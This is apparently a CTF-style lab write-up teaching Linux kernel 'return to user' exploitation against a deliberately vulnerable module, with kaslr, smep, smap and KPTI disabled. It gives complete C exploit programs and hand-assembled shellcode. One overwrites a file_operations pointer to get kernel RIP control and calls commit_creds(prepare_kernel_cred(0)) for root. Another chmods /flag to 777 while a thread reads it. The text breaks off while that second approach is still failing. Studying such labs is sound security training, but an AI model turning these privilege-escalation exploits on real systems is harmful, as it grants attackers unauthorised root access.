# return to user

In this lab(?) we are going to exploit a kernel with the following primitives/conditions.

```
1. arbitrary read/write and a stack leak
2. no kalsr
3. no smep, smap or KPTI
```

Most files are in the `image` directory. `./compress.sh` compiles your `exploit.c` in your `exploit` directory and merges it into the initial filesystem. `./boot.sh` boots the vm with the following conditions above. no need to look at `./decompress.sh`; it decompresses `rootfs.cpio` to `initramfs` directory, but it is not needed unless you accidentally delete or corrupt the initramfs directory.

The vulnerable kernel module is located at `src/vuln.ko`. You should load this onto IDA or any sort of analyzer and check what it does. Also the source code for the module is located at `src/vuln.c` and `src/vuln.h` so cross-check it out with the disassembly.

## basics
In this session, we are going to practice the technique return to user. All other techniques (kernel rop, physmap spray) are based on this technique, so it is very important that we understand it thoroughly.

The basic idea is to overwrite a kernel function pointer to a userspace RWX region with prepared shellcode. However, there are 3 parts that have 'realistic' difficulties. Let's go through them each.

## 1. Finding what to overwrite
There are many ways to control RIP, but in this case we are going to overwrite the `file_operations` structure in the vulnerable kernel module. I chose this because it is rather easy to find and trigger. 

Since there is no KASLR, kernel modules and kernel code is not randomized. We can find their addresses by looking at the `/proc/kallsyms` and `/proc/modules` files. But to view them, we must be root, or else the addresses are hidden. So we edit line 12 in `initramfs/etc/init.d/rcS` file to `setsid cttyhack setuidgid 0 sh` so that we boot as root, instead of uid1000. Then we run `./compress.sh` and `./boot.sh` in order and we get a root shell.

```
/ # cat /proc/modules
vuln 16384 0 - Live 0xffffffffc0000000 (PO)

/ # cat /proc/kallsyms | grep vuln
ffffffffc0000010 t copy_overflow	[vuln]
ffffffffc0000143 t vuln_exit	[vuln]
ffffffffc0000143 t cleanup_module	[vuln]
ffffffffc0000000 t vuln_open	[vuln]
ffffffffc0000140 t vuln_release	[vuln]
ffffffffc0000030 t vuln_ioctl	[vuln]
```

If we re-boot the address doesn't change. This is because we disabled kaslr.
From the leaks, we can know that the vulnerable kernel module base is 0xffffffffc0000000. The offset of `vuln_fops` is 0x3c0, so let's look it up in the debugger. (We need to add `-s` argument to `boot.sh`, boot it and connect to gdbstub via `target remote localhost:1234`)

When we try to dump the address 0xffffffffc00003c0, there are nothing but zeros. Something is going horribly wrong... I guessed that the .data section must have a separate base, and tried to find the address manually by looking at the assembly code for `vuln_init`.

```
pwndbg> x/i 0xffffffffc0000143
   0xffffffffc0000143:	mov    rdi,0xffffffffc0002480
pwndbg> 
   0xffffffffc000014a:	call   0xffffffff8143f640
pwndbg> 
   0xffffffffc000014f:	mov    rdi,0xffffffffc00010e8
pwndbg> 
   0xffffffffc0000156:	jmp    0xffffffff810a9359
```

What the fuck? The assembly is different from what I saw in IDA. But one thing is for sure: the `vuln_dev` structure is located at 0xffffffffc0002480 so I take a look at it.

```
pwndbg> x/100gx 0xffffffffc0002480
0xffffffffc0002480:	0x0000000000000039	0xffffffffc000113f
0xffffffffc0002490:	0xffffffffc0002000	0xffffffff822467c0
0xffffffffc00024a0:	0xffffffff822b05e0	0x0000000000000000
0xffffffffc00024b0:	0xffff888002b72400	0x0000000000000000
```

The shape of `struct miscdevice` is the following
```
struct miscdevice  {
	int minor;
	const char *name;
	const struct file_operations *fops;
	struct list_head list;
	struct device *parent;
	struct device *this_device;
	const struct attribute_group **groups;
	const char *nodename;
	umode_t mode;
};
```

Therefore `vuln_fops` must be located at 0xffffffffc0002000. Let's take a look at it.

```
pwndbg> x/100gx 0xffffffffc0002000
0xffffffffc0002000:	0x0000000000000000	0x0000000000000000
0xffffffffc0002010:	0x0000000000000000	0x0000000000000000
0xffffffffc0002020:	0x0000000000000000	0x0000000000000000
0xffffffffc0002030:	0x0000000000000000	0x0000000000000000
0xffffffffc0002040:	0x0000000000000000	0xffffffffc0000030
0xffffffffc0002050:	0x0000000000000000	0x0000000000000000
0xffffffffc0002060:	0x0000000000000000	0xffffffffc0000000
0xffffffffc0002070:	0x0000000000000000	0xffffffffc0000140
```

As you can see there are 3 pointers, (0xffffffffc0000030 = ioctl, 0xffffffffc0000000 = open, 0xffffffffc0000140 = release). By overwriting 0xffffffffc0002068 to some other value and calling `open("dev/vuln")` in userspace, we can get RIP control in kernel space. Let's test it out with the following proof of concept code.

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define VULN_READ 0x1111
#define VULN_WRITE 0x2222
#define VULN_STACK 0x3333

struct rwRequest {
	void *kaddr;
	void *uaddr;
	size_t length;
};

int Open(char *fname, int mode) {
	int fd;
	if ((fd = open(fname, mode)) < 0) {
		perror("open");
		exit(-1);
	}
	return fd;
}

void write64(unsigned long kaddr, unsigned long value) {

	struct rwRequest req;
	unsigned long value_ = value;

	req.uaddr = &value_;
	req.length = 8;
	req.kaddr = (void *)kaddr;

	int fd = Open("/dev/vuln", O_RDONLY);

	if (ioctl(fd, VULN_WRITE, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}
}

int main (int argc, char **argv){

	write64(0xffffffffc0002068, 0xcafebebedeadbeef);
	open("/dev/vuln", O_RDONLY);
	return 0;
	
}
```

Now to execute this in the vm, just do write the code in `exploit/exploit.c`, execute `./compress.sh` and `./boot.sh` sequentially. The binary will be stored in `/home/ctf/runme`, and running it give us the following result:

```
[    8.982661] RIP: 0010:0xcafebebedeadbeef
[    8.982788] Code: Bad RIP value.
[    8.982864] RSP: 0018:ffffc900000d7c60 EFLAGS: 00000282
[    8.982990] RAX: cafebebedeadbeef RBX: ffffffffc0002480 RCX: ffff888003358920
[    8.983153] RDX: ffff8880031f9880 RSI: ffff888002b18800 RDI: ffff888002b305b8
[    8.983339] RBP: 0000000000000039 R08: 0000000000000000 R09: 0000000000000000
[    8.983576] R10: ffffc900000d7cc8 R11: 0000000000000000 R12: ffff888002b18800
[    8.983762] R13: ffff888002b305b8 R14: ffffffffc0002000 R15: ffff888002b18800
```

Now we have RIP control, nice!

## 2. What code should we run

In userspace exploits, shellcode usually did `execve("/bin/sh", NULL, NULL)`. That doesn't work for kernelspace, because the goal isn't spawning a shell (and even if it was, we cannot use syscalls) The goal is to change our uid to root. There are two ways to do this.
```
1. locate the cred structure, change the uid, euid, gid fields to 0
2. execute commit_creds(prepare_kernel_cred(0))
```

There is a dirty 3rd option, which will be discussed later.
```
3. escalate to root, chmod the flag file to 777 and loop forever, while another userspace thread reads the flag file.
```

The 1st option is becoming harder and harder due to structure randomization in the linux kernel. The second one is very easy. First, we find the address of the functions `commit_creds` and `prepare_kernel_cred`.

```
/ # cat /proc/kallsyms | grep commit_creds
ffffffff8107bd20 T commit_creds
/ # cat /proc/kallsyms | grep prepare_kernel_cred
ffffffff8107c0a0 T prepare_kernel_cred
```

So basically our shellcode should be this:

```nasm
xor rdi, rdi
mov rcx, 0xffffffff8107c0a0
call rcx
mov rdi, rax
mov rcx, 0xffffffff8107bd20
call rcx
ret
```

The last instruction is `ret`, and this is perfectly fine because the `vuln_open` function originally returned with a `ret` instruction as well, and due to the coherency of the calling convention, it should work fine. Let's check it out.

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>

#define VULN_READ 0x1111
#define VULN_WRITE 0x2222
#define VULN_STACK 0x3333

struct rwRequest {
	void *kaddr;
	void *uaddr;
	size_t length;
};

int Open(char *fname, int mode) {
	int fd;
	if ((fd = open(fname, mode)) < 0) {
		perror("open");
		exit(-1);
	}
	return fd;
}

void write64(unsigned long kaddr, unsigned long value) {

	struct rwRequest req;
	unsigned long value_ = value;

	req.uaddr = &value_;
	req.length = 8;
	req.kaddr = (void *)kaddr;

	int fd = Open("/dev/vuln", O_RDONLY);

	if (ioctl(fd, VULN_WRITE, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}
}

unsigned long leak_stack() {
	struct rwRequest req;
	unsigned long stack;

	int fd = Open("/dev/vuln", O_RDONLY);

	req.uaddr = &stack;
	if (ioctl(fd, VULN_STACK, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}

	return stack;
}

int main (int argc, char **argv){
	/*
	xor rdi, rdi
	mov rcx, 0xffffffff8107c0a0
	call rcx
	mov rdi, rax
	mov rcx, 0xffffffff8107bd20
	call rcx
	ret
	*/
	char sc[] = "\x48\x31\xFF\x48\xC7\xC1\xA0\xC0\x07\x81\xFF\xD1\x48\x89\xC7\x48\xC7\xC1\x20\xBD\x07\x81\xFF\xD1\xC3";

	void *sc_addr = mmap((void *)0xdead000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE, -1, 0);
	if (sc_addr == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}

	memcpy(sc_addr, sc, sizeof(sc));
	write64(0xffffffffc0002068, sc_addr);
	open("/dev/vuln", O_RDONLY);
	system("/bin/sh");

	return 0;
}
```

The char array `sc` is the assembled version of the shellcode I wrote earlier. Now let's run it.

```
/ $ /home/ctf/runme
/ # id
uid=0(root) gid=0(root)
```

Booyah! It works beautifully.

## 3. Dirty ways

Sometimes it is not possible to return beautifully with a single `ret` instruction as in the previous example. One example is if the vulnerability is a stack buffer overflow, and PC control is obtained via overwritten return address. In this case, we have two options:
```
1. switch from kernel space to user space directly.
2. escalate to root, chmod 777 /flag, and loop forever while another thread is reads the flag
```

The 2nd option seems much easier, although it is a lot more dirtier and CTF-oriented. Let's try it out. To chmod the flag, we need to find the address of the chmod function.

```
/ # cat /proc/kallsyms | grep chmod
ffffffff811a0830 t chmod_common
ffffffff811a1ab0 T ksys_fchmod
ffffffff811a1b30 T __x64_sys_fchmod
ffffffff811a1b40 T __ia32_sys_fchmod
ffffffff811a1b50 T do_fchmodat
ffffffff811a1bd0 T __x64_sys_fchmodat
ffffffff811a1bf0 T __ia32_sys_fchmodat
ffffffff811a1c10 T __x64_sys_chmod
ffffffff811a1c30 T __ia32_sys_chmod
ffffffff811fca00 T __posix_acl_chmod
ffffffff811fcde0 T posix_acl_chmod
ffffffff8121e190 T sysfs_chmod_file
```

So, the chmod handler is `ffffffff811a1c10 T __x64_sys_chmod`, let's write some shellcode with it. But first, we need to know how arguments are set up for the system call handler. Let's take a look at the assembly via debugger. First, we set a breakpoint at 0xffffffff811a1c10 and execute `chmod 777 /flag` in the shell. We trap into the breakpoint.

```
► 0xffffffff811a1c10    movzx  edx, word ptr [rdi + 0x68]
  0xffffffff811a1c14    mov    rsi, qword ptr [rdi + 0x70]
  0xffffffff811a1c18    mov    edi, 0xffffff9c
  0xffffffff811a1c1d    call   0xffffffff811a1b50
 
  0xffffffff811a1c22    cdqe   
  0xffffffff811a1c24    ret
```

It seems that 0xffffffff811a1b50 is the main routine, and the code before it sets the arguments for it.
```
 RAX  0xffffffff811a1c10 ◂— 0x70778b486857b70f
 RBX  0x0
 RCX  0x0
 RDX  0x1ff
 RDI  0xffffff9c
 RSI  0x7ffca5064f7b ◂— 0x53550067616c662f /* '/flag' */
 R8   0x0
 R9   0x0
 R10  0x0
 R11  0x0
 R12  0x0
 R13  0x0
 R14  0x0
 R15  0x0
 RBP  0xffffc900000c7f58 —▸ 0x4506bb ◂— push   r13 /* 0x55d5894954415541 */
 RSP  0xffffc900000c7f38 —▸ 0xffffffff81002213 ◂— 0x48b486550458948
 RIP  0xffffffff811a1c1d ◂— 0xc39848ffffff2ee8
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────
   0xffffffff811a1c10    movzx  edx, word ptr [rdi + 0x68]
   0xffffffff811a1c14    mov    rsi, qword ptr [rdi + 0x70]
   0xffffffff811a1c18    mov    edi, 0xffffff9c
 ► 0xffffffff811a1c1d    call   0xffffffff811a1b50
 
   0xffffffff811a1c22    cdqe   
   0xffffffff811a1c24    ret
```

So, we can see that in order to chmod 777, we have to set RDI to 0xffffff9c, RSI to "/flag" and RDX to 0x1ff (0777) and call 0xffffffff811a1b50. Now this is our new exploit.

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <pthread.h>

#define VULN_READ 0x1111
#define VULN_WRITE 0x2222
#define VULN_STACK 0x3333

struct rwRequest {
	void *kaddr;
	void *uaddr;
	size_t length;
};

int Open(char *fname, int mode) {
	int fd;
	if ((fd = open(fname, mode)) < 0) {
		perror("open");
		exit(-1);
	}
	return fd;
}

void write64(unsigned long kaddr, unsigned long value) {

	struct rwRequest req;
	unsigned long value_ = value;

	req.uaddr = &value_;
	req.length = 8;
	req.kaddr = (void *)kaddr;

	int fd = Open("/dev/vuln", O_RDONLY);

	if (ioctl(fd, VULN_WRITE, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}
}

unsigned long leak_stack() {
	struct rwRequest req;
	unsigned long stack;

	int fd = Open("/dev/vuln", O_RDONLY);

	req.uaddr = &stack;
	if (ioctl(fd, VULN_STACK, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}

	return stack;
}

void read_flag() {
	char buf[0x100];
	memset(buf, 0, sizeof(buf));

	while(1) {
		int fd = open("/flag", O_RDONLY);
		if (fd != -1) {
			puts("[+] succeeded in reading the flag!");
			read(fd, buf, sizeof(buf));
			printf("the flag is: %s\n", buf);
			exit(-1);
		}
	}
}

int main (int argc, char **argv){
	/*
	xor rdi, rdi
	mov rcx, 0xffffffff8107c0a0
	call rcx
	mov rdi, rax
	mov rcx, 0xffffffff8107bd20
	call rcx
	mov r15, 0x67616c662f
	push r15
	mov rdi, 0xffffff9c
	mov rsi, rsp
	mov rdx, 0777
	mov rcx, 0xffffffff811a1b50
	call rcx
	jmp $
	*/

	pthread_t tid;
	char sc[] = "\x48\x31\xFF\x48\xC7\xC1\xA0\xC0\x07\x81\xFF\xD1\x48\x89\xC7\x48\xC7\xC1\x20\xBD\x07\x81\xFF\xD1\x49\xBF\x2F\x66\x6C\x61\x67\x00\x00\x00\x41\x57\x48\xBF\x9C\xFF\xFF\xFF\x00\x00\x00\x00\x48\x89\xE6\x48\xC7\xC2\xFF\x01\x00\x00\x48\xC7\xC1\x50\x1B\x1A\x81\xFF\xD1\xEB\xFE";

	void *sc_addr = mmap((void *)0xdead000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE, -1, 0);
	if (sc_addr == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}

	memcpy(sc_addr, sc, sizeof(sc));
	write64(0xffffffffc0002068, sc_addr);
	pthread_create(&tid, NULL, read_flag, NULL);
	open("/dev/vuln", O_RDONLY);

	return 0;
}
```

However, it doesn't work. I set a breakpoint on 0xdead000 and investigate the return value of the function call 0xffffffff811a1b50. The error number is 14, which is bad address. Maybe I shouldn't use a kernel address for storing "/flag" string. I should use 0xdeadf00, which is a userspace address. So I use this instead.

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <pthread.h>

#define VULN_READ 0x1111
#define VULN_WRITE 0x2222
#define VULN_STACK 0x3333

struct rwRequest {
	void *kaddr;
	void *uaddr;
	size_t length;
};

int Open(char *fname, int mode) {
	int fd;
	if ((fd = open(fname, mode)) < 0) {
		perror("open");
		exit(-1);
	}
	return fd;
}

void write64(unsigned long kaddr, unsigned long value) {

	struct rwRequest req;
	unsigned long value_ = value;

	req.uaddr = &value_;
	req.length = 8;
	req.kaddr = (void *)kaddr;

	int fd = Open("/dev/vuln", O_RDONLY);

	if (ioctl(fd, VULN_WRITE, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}
}

unsigned long leak_stack() {
	struct rwRequest req;
	unsigned long stack;

	int fd = Open("/dev/vuln", O_RDONLY);

	req.uaddr = &stack;
	if (ioctl(fd, VULN_STACK, &req) < 0) {
		perror("ioctl");
		exit(-1);
	}

	return stack;
}

void read_flag() {
	char buf[0x100];
	memset(buf, 0, sizeof(buf));

	while(1) {
		int fd = open("/flag", O_RDONLY);
		if (fd != -1) {
			puts("[+] succeeded in reading the flag!");
			read(fd, buf, sizeof(buf));
			printf("the flag is: %s\n", buf);
			exit(-1);
		}
	}
}

int main (int argc, char **argv){
	/*
	xor rdi, rdi
	mov rcx, 0xffffffff8107c0a0
	call rcx
	mov rdi, rax
	mov rcx, 0xffffffff8107bd20
	call rcx
	mov r15, 0x67616c662f
	mov r14, 0xdeadf00
	mov [r14], r15
	mov rdi, 0xffffff9c
	mov rsi, r14
	mov rdx, 0777
	mov rcx, 0xffffffff811a1b50
	call rcx
	jmp $
	*/

	pthread_t tid;
	char sc[] = "\x48\x31\xFF\x48\xC7\xC1\xA0\xC0\x07\x81\xFF\xD1\x48\x89\xC7\x48\xC7\xC1\x20\xBD\x07\x81\xFF\xD1\x49\xBF\x2F\x66\x6C\x61\x67\x00\x00\x00\x49\xC7\xC6\x00\xDF\xEA\x0D\x4D\x89\x3E\x48\xBF\x9C\xFF\xFF\xFF\x00\x00\x00\x00\x4C\x89\xF6\x48\xC7\xC2\xFF\x01\x00\x00\x48\xC7\xC1\x50\x1B\x1A\x81\xFF\xD1\xEB\xFE";

	void *sc_addr = mmap((void *)0xdead000, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE, -1, 0);
	if (sc_addr == MAP_FAILED) {
		perror("mmap");
		exit(-1);
	}

	memcpy(sc_addr, sc, sizeof(sc));
	write64(0xffffffffc0002068, sc_addr);
	pthread_create(&tid, NULL, read_flag, NULL);
	open("/dev/vuln", O_RDONLY);

	return 0;
}
```

It still doesn't work. However, the return value is 0 now, so `chmod`ing works. My guess for this is that the thread does not allow to switch to other threads, since kernel threads aren't pre-emptive, meaning that a thread only switches context if it actively calls the appropriate API. I need to find a way to context switch to another thread.